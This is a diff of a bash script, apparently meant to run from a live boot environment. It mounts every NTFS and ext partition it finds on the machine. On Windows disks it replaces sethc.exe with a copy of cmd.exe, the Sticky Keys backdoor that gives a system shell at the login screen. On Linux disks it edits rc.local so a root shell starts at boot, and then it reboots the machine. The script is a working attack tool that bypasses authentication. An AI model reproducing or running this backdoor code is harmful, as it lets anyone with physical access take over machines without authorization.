@@ -1,35 +1,41 @@
-beans=0
-sethcrekd=0
-while [ $beans == 0 ]; 
+#!/bin/bash
+# This script is written by Michael Bailey
+# It is covered under the Beerware license
+mkdir /mountpoint
+ntfsparts=($(blkid | grep "ntfs" | cut -d: -f1))
+for i in "${ntfsparts[@]}"
 do
-	fdisk -l
-	echo Select device block
-	read deviceblk
-	mkdir /winmount
-	mount /dev/$deviceblk /winmount
-	cd /winmount
-	win=$(ls | grep -i windows)
-	sys=$(ls $win | grep -i system32)
-	ls -la $win/$sys/sethc.exe
-	if [ $? -eq 0 ]; then
-		mv $win/$sys/sethc.exe $win/$sys/sethc$RANDOM.exe
-		cp $win/$sys/cmd.exe $win/$sys/sethc.exe
-		beans=1
-		sethcrekd=1
-	fi
-	if [ $sethcrekd == 0 ]; then
-		updatedb
-		counts=$(locate sethc.exe | grep sethc.exe$ | wc -l)
-		if [ $counts == 1 ]; then
-			sethcdir=$(locate sethc.exe | grep sethc.exe$)
-			sysdir=$(echo $sethdcir | sed 's/sethc.exe//g')
-			mv $sysdir/sethc.exe $sysdir/sethc$random.exe
-			cp $sysdir/cmd.exe $sysdir/sethc.exe
-			beans=1
-			sethcrekd=1
-		fi
-		if [ $counts == 0 ]; then
-			echo No sethc.exe found. Sorry.
-		fi
-	fi
+	foldername=$(echo a$ntfsparts | sed 's/\///g')
+	mkdir /mountpoint/$foldername
+	mount $i /mountpoint/$foldername
 done
+echo Payload time lol
+sethcpath=$(find /mountpoint -name sethc.exe | grep -i WINDOWS/system32/sethc.exe$)
+nosethc=$(echo $sethcpath | sed 's/\/sethc.exe//g')
+mv $sethcpath $sethcpath.$RANDOM
+cp $nosethc/cmd.exe $nosethc/sethc.exe
+# First part of Linux
+extparts=($(blkid | grep "ext" | cut -d: -f1))
+for i in "${extparts[@]}"
+do
+        foldername2=$(echo b$extparts | sed 's/\///g')
+        mkdir /mountpoint/$foldername2
+        mount $i /mountpoint/$foldername2
+	rcloc=$(find /mountpoint/$foldername2 -name rc.local)
+	if [ -a /usr/bin/bash ] || [ -a /bin/bash ] || [ -a /usr/sbin/bash ]; then
+		sed -i 's/exit 0/\/bin\/bash/g' $rcloc
+	else
+                sed -i 's/exit 0/\/bin\/sh/g' $rcloc
+	fi
+	echo exit 0 >> $rcloc
+done
+
+
+
+
+# unmount everything
+umount /mountpoint/*
+# go ahead and shut down
+shutdown -r now
+reboot
+halt
